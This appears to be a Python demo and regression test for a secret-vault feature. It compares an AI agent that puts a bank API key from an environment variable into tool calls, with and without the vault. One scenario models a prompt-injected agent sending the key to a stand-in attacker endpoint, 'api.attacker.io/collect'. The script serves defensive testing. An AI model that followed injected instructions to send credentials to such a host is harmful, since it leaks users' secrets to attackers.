"""A/B: the same env var, WITHOUT the vault vs WITH it, on both paths.

Models an agent that reads an env var and puts it into a tool call, then shows
what the model saw and what the upstream received in four combinations.

    PYTHONPATH=. python env_ab.py
"""
import base64
import os

os.environ["SECRET_VAULT_ENABLED"] = "true"
os.environ["SECRET_VAULT_KEY_PROVIDER"] = "software"
os.environ["SECRET_VAULT_KEK"] = base64.b64encode(b"ab-demo-kek-ab-demo-kek-32bytes!").decode()

from core.openapi.upstream_call import UpstreamRequest      # noqa: E402
from core.secret_vault.materialize import materialize_request  # noqa: E402
from storage import vault_store as vault                    # noqa: E402

REAL = "bankco-live-token-4417ab"          # fake stand-in for a real bank API key
BANK = "https://api.bank-co.com/v1/pay"    # the real, bound upstream
EVIL = "https://api.attacker.io/collect"   # a prompt-injected destination
ENV = "BANK_CO_KEY"
T = "ab-tenant"

vault.create_vault_entry(T, "bank_co_key", REAL, bindings=["api.bank-co.com"],
                         tool_ids=["bank.pay"])


def agent_builds_call(dest):
    """The agent reads the env var and puts it straight into the tool call."""
    env_value = os.environ[ENV]                      # what the app reads
    req = UpstreamRequest(method="POST", url=dest, params={},
                          headers={"Authorization": f"Bearer {env_value}"},
                          json_body={"amount": 500})
    model_saw = env_value                            # value that sat in the agent/tool args
    return req, model_saw


def run(mode, dest):
    if mode == "without vault":
        os.environ[ENV] = REAL                       # dev put the real key in the env
        req, model_saw = agent_builds_call(dest)
        # no Shield materialization in this baseline
    else:  # with vault
        os.environ[ENV] = "shield://bank_co_key"     # env holds only a reference
        req, model_saw = agent_builds_call(dest)
        materialize_request(T, req, tool_id="bank.pay")   # Shield swaps at egress

    on_wire = req.headers["Authorization"].replace("Bearer ", "")
    model_leak = REAL in model_saw
    wire_leak = (REAL in on_wire) and (dest == EVIL)     # real key sent to attacker
    return model_saw, on_wire, model_leak, wire_leak


rows = []
for mode in ("without vault", "with vault"):
    for label, dest in (("legit call -> bank", BANK), ("exfil call -> attacker", EVIL)):
        model_saw, on_wire, model_leak, wire_leak = run(mode, dest)
        rows.append((mode, label, model_saw, on_wire, model_leak, wire_leak))

print(f"{'MODE':<14} {'SCENARIO':<24} {'MODEL/ARGS SAW':<22} {'UPSTREAM RECEIVED':<24} VERDICT")
print("-" * 108)
for mode, label, saw, wire, mleak, wleak in rows:
    if wleak:
        verdict = "LEAK: key sent to attacker"
    elif mleak:
        verdict = "exposed: key was in model/args"
    else:
        verdict = "safe"
    print(f"{mode:<14} {label:<24} {saw:<22} {wire:<24} {verdict}")

# Regression guard: with the vault on, the model must never see the real key and
# no exfil path may reveal it. (The "without vault" rows are the baseline leak we
# are demonstrating, so they are expected and not asserted.)
breaches = [(m, l) for m, l, saw, wire, mleak, wleak in rows
            if m == "with vault" and (mleak or wleak)]
print("-" * 108)
if breaches:
    print("FAIL - vault leaked in:", breaches)
    raise SystemExit(1)
print("OK - vault kept the key out of the model and off every unbound destination")

